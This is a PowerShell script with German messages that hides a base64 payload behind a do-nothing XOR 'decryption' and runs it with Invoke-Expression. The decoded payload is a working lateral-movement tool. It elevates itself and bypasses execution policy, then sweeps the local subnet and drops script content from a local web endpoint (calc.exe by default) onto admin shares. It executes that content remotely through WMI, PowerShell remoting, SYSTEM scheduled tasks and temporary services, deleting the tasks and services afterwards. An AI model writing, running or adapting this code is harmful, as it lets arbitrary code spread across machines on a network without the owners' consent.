function R1 { param($rnd) if($null -ne $rnd){ return $rnd.Next(1,101) } else { return (Get-Random -Minimum 1 -Maximum 101) } }
function R2 { param([byte[]]$x,[byte[]]$y) $z = New-Object byte[] $x.Length; for($i=0;$i -lt $x.Length;$i++){ $z[$i] = $x[$i] -bxor $y[$i % $y.Length] } ; return $z }

# 
$zutat = "JGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KaWYgKC1ub3QgJGN1cnJlbnRQcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSkgew0KICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbCAiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgYCIkKCRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGgpYCIiIC1WZXJiIFJ1bkFzDQogICAgZXhpdA0KfQ0KDQojIGNhbGMuZXhlIGFscyBUZXN0LUNvZGUgaW4gZGllIERhdGVpIHNjaHJlaWJlbg0KJHdlYkNvbnRlbnQgPSAiU3RhcnQtUHJvY2VzcyBjYWxjLmV4ZSINCnRyeSB7DQogICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9sb2NhbGhvc3Q6ODA4MC9pbmRleC5waHAiIC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMw0KICAgIGlmICgkcmVzcG9uc2UuU3RhdHVzQ29kZSAtZXEgMjAwKSB7DQogICAgICAgICR3ZWJDb250ZW50ID0gJHJlc3BvbnNlLkNvbnRlbnQNCiAgICB9DQp9IGNhdGNoIHt9DQoNCiRsb2NhbElQID0gKFRlc3QtQ29ubmVjdGlvbiAoaG9zdG5hbWUpIC1Db3VudCAxKS5JUFY0QWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZw0KJHN1Ym5ldCA9ICRsb2NhbElQIC1yZXBsYWNlICdcLlxkKyQnLCAnLjAnDQoNCkAoMS4uMTAgKyA1MCwgMTAwLCAxNTAsIDIwMCwgMjU0KSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAkdGFyZ2V0SVAgPSAiJCgkc3VibmV0IC1yZXBsYWNlICdcLjAkJywgIi4kXyIpIg0KICAgIGlmICgkdGFyZ2V0SVAgLWVxICRsb2NhbElQKSB7IHJldHVybiB9DQogICAgDQogICAgaWYgKFRlc3QtQ29ubmVjdGlvbiAkdGFyZ2V0SVAgLUNvdW50IDEgLVF1aWV0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7DQogICAgICAgICRmaWxlQ3JlYXRlZCA9ICRmYWxzZQ0KICAgICAgICANCiAgICAgICAgQCgiQyQiLCAiQURNSU4kIiwgIklQQyQiKSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgkZmlsZUNyZWF0ZWQpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgICRzaGFyZSA9ICRfDQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gIlxcJHRhcmdldElQXCRzaGFyZSIgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICRmaWxlUGF0aHMgPSBAKA0KICAgICAgICAgICAgICAgICAgICAiXFwkdGFyZ2V0SVBcJHNoYXJlXFdpbmRvd3NcVGVtcFwxLnR4dCIsDQogICAgICAgICAgICAgICAgICAgICJcXCR0YXJnZXRJUFwkc2hhcmVcUHJvZ3JhbURhdGFcMS50eHQiLA0KICAgICAgICAgICAgICAgICAgICAiXFwkdGFyZ2V0SVBcJHNoYXJlXFdpbmRvd3NcU3lzdGVtMzJcMS50eHQiLA0KICAgICAgICAgICAgICAgICAgICAiXFwkdGFyZ2V0SVBcJHNoYXJlXFVzZXJzXFB1YmxpY1xEb2N1bWVudHNcMS50eHQiDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRwYXRoIGluICRmaWxlUGF0aHMpIHsNCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICR3ZWJDb250ZW50IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwYXRoIC1FbmNvZGluZyBVVEY4IC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgICAgICAgICAgICAgICAgICAkbG9jYWxQYXRoID0gJHBhdGggLXJlcGxhY2UgIlxcXFwkdGFyZ2V0SVBcXFwkc2hhcmUiLCAiQzoiDQogICAgICAgICAgICAgICAgICAgICAgICAkcHNDb21tYW5kID0gIkdldC1Db250ZW50ICckbG9jYWxQYXRoJyAtUmF3IHwgaWV4Ig0KICAgICAgICAgICAgICAgICAgICAgICAgSW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICR0YXJnZXRJUCAtQ2xhc3MgV2luMzJfUHJvY2VzcyAtTmFtZSBDcmVhdGUgLUFyZ3VtZW50TGlzdCAicG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgJHBzQ29tbWFuZCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVDcmVhdGVkID0gJHRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggeyBjb250aW51ZSB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBjYXRjaCB7fQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAoLW5vdCAkZmlsZUNyZWF0ZWQpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfT3BlcmF0aW5nU3lzdGVtIC1Db21wdXRlck5hbWUgJHRhcmdldElQIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICAkdGVtcFBhdGggPSAiQzpcV2luZG93c1xUZW1wXDEudHh0Ig0KICAgICAgICAgICAgICAgICRiNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkd2ViQ29udGVudCkpDQogICAgICAgICAgICAgICAgJGNyZWF0ZUZpbGVDbWQgPSAicG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgYCJbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCckYjY0JykpIHwgT3V0LUZpbGUgJyR0ZW1wUGF0aCcgLUVuY29kaW5nIFVURjhgIiINCiAgICAgICAgICAgICAgICAkb3BlbkZpbGVDbWQgPSAicG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgYCJHZXQtQ29udGVudCAnJHRlbXBQYXRoJyAtUmF3IHwgaWV4YCIiDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgSW52b2tlLVdtaU1ldGhvZCAtQ2xhc3MgV2luMzJfUHJvY2VzcyAtTmFtZSBDcmVhdGUgLUFyZ3VtZW50TGlzdCAkY3JlYXRlRmlsZUNtZCAtQ29tcHV0ZXJOYW1lICR0YXJnZXRJUCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgSW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICR0YXJnZXRJUCAtQ2xhc3MgV2luMzJfUHJvY2VzcyAtTmFtZSBDcmVhdGUgLUFyZ3VtZW50TGlzdCAkb3BlbkZpbGVDbWQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICRmaWxlQ3JlYXRlZCA9ICR0cnVlDQogICAgICAgICAgICB9IGNhdGNoIHt9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmICgtbm90ICRmaWxlQ3JlYXRlZCkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkc2Vzc2lvbiA9IE5ldy1QU1Nlc3Npb24gLUNvbXB1dGVyTmFtZSAkdGFyZ2V0SVAgLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2Vzc2lvbiAkc2Vzc2lvbiAtU2NyaXB0QmxvY2sgew0KICAgICAgICAgICAgICAgICAgICBwYXJhbSgkbXNnKQ0KICAgICAgICAgICAgICAgICAgICAkbXNnIHwgT3V0LUZpbGUgIkM6XFdpbmRvd3NcVGVtcFwxLnR4dCIgLUVuY29kaW5nIFVURjgNCiAgICAgICAgICAgICAgICAgICAgR2V0LUNvbnRlbnQgIkM6XFdpbmRvd3NcVGVtcFwxLnR4dCIgLVJhdyB8IGlleA0KICAgICAgICAgICAgICAgIH0gLUFyZ3VtZW50TGlzdCAkd2ViQ29udGVudA0KICAgICAgICAgICAgICAgIFJlbW92ZS1QU1Nlc3Npb24gJHNlc3Npb24NCiAgICAgICAgICAgICAgICAkZmlsZUNyZWF0ZWQgPSAkdHJ1ZQ0KICAgICAgICAgICAgfSBjYXRjaCB7fQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAoLW5vdCAkZmlsZUNyZWF0ZWQpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHRhc2tOYW1lID0gIklUXyQoR2V0LVJhbmRvbSkiDQogICAgICAgICAgICAgICAgJGI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR3ZWJDb250ZW50KSkNCiAgICAgICAgICAgICAgICAkcHNDb21tYW5kID0gIltTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJyRiNjQnKSkgfCBPdXQtRmlsZSAnQzpcV2luZG93c1xUZW1wXDEudHh0JyAtRW5jb2RpbmcgVVRGODsgR2V0LUNvbnRlbnQgJ0M6XFdpbmRvd3NcVGVtcFwxLnR4dCcgLVJhdyB8IGlleCINCiAgICAgICAgICAgICAgICAkcHNFbmNvZGVkID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJHBzQ29tbWFuZCkpDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgc2NodGFza3MgL2NyZWF0ZSAvcyAkdGFyZ2V0SVAgL3RuICR0YXNrTmFtZSAvdHIgInBvd2Vyc2hlbGwuZXhlIC1FbmNvZGVkQ29tbWFuZCAkcHNFbmNvZGVkIiAvc2Mgb25jZSAvc3QgMDA6MDAgL3J1IFNZU1RFTSAvZiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICBzY2h0YXNrcyAvcnVuIC9zICR0YXJnZXRJUCAvdG4gJHRhc2tOYW1lIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIDINCiAgICAgICAgICAgICAgICBzY2h0YXNrcyAvZGVsZXRlIC9zICR0YXJnZXRJUCAvdG4gJHRhc2tOYW1lIC9mIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICRmaWxlQ3JlYXRlZCA9ICR0cnVlDQogICAgICAgICAgICB9IGNhdGNoIHt9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmICgtbm90ICRmaWxlQ3JlYXRlZCkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkc2VydmljZU5hbWUgPSAiSVRfJChHZXQtUmFuZG9tKSINCiAgICAgICAgICAgICAgICAkYjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJHdlYkNvbnRlbnQpKQ0KICAgICAgICAgICAgICAgICRwc0NvbW1hbmQgPSAiW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnJGI2NCcpKSB8IE91dC1GaWxlICdDOlxXaW5kb3dzXFRlbXBcMS50eHQnIC1FbmNvZGluZyBVVEY4OyBHZXQtQ29udGVudCAnQzpcV2luZG93c1xUZW1wXDEudHh0JyAtUmF3IHwgaWV4Ig0KICAgICAgICAgICAgICAgICRwc0VuY29kZWQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkcHNDb21tYW5kKSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBzYy5leGUgXFwkdGFyZ2V0SVAgY3JlYXRlICRzZXJ2aWNlTmFtZSBiaW5QYXRoPSAicG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kICRwc0VuY29kZWQiIHN0YXJ0PSBkZW1hbmQgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgc2MuZXhlIFxcJHRhcmdldElQIHN0YXJ0ICRzZXJ2aWNlTmFtZSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAyDQogICAgICAgICAgICAgICAgc2MuZXhlIFxcJHRhcmdldElQIGRlbGV0ZSAkc2VydmljZU5hbWUgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgJGZpbGVDcmVhdGVkID0gJHRydWUNCiAgICAgICAgICAgIH0gY2F0Y2gge30NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAzMDA7IGNhbGMuZXhlDQogICAgfQ0KfQ=="
$seed  = $null              # 

try{
    if([string]::IsNullOrEmpty($zutat)){ throw "." }
    if($zutat.Length -lt 27){ throw "Z" }

    $s1 = $zutat.Substring(0,4)
    $s2 = $zutat.Substring(4,5)
    $s3 = $zutat.Substring(9,4)
    $s4 = $zutat.Substring(13,6)
    $s5 = $zutat.Substring(19,3)
    $s6 = $zutat.Substring(22,5)
    $s7 = $zutat.Substring(27)
    $gekocht = $s1+$s2+$s3+$s4+$s5+$s6+$s7

    $b = [Text.Encoding]::UTF8.GetBytes($gekocht)

    if($null -ne $seed){ $rand = New-Object System.Random($seed); $r = R1 $rand } else { $r = R1 $null }

    $c = [string][math]::Round([math]::Pow($r,10))
    $d = [Text.Encoding]::UTF8.GetBytes($c)
    if($d.Length -eq 0){ throw "Key-Bytes leer." }
    $e = $d[($d.Length-1)..0]

    $f1 = R2 -x $b -y $d
    $f2 = R2 -x $f1 -y $e
    $g = [Text.Encoding]::UTF8.GetString($f2)

    $h = R2 -x ([Text.Encoding]::UTF8.GetBytes($g)) -y $e
    $i = R2 -x $h -y $d
    $j = [Text.Encoding]::UTF8.GetString($i)

    try{ $k = [Convert]::FromBase64String($j) } catch { throw "Base64-Decode fehlgeschlagen: $($_.Exception.Message)" }
    $l = [Text.Encoding]::UTF8.GetString($k)

    #
    Invoke-Expression $l

} catch {
    Write-Error "Fehler: $($_.Exception.Message)"
}
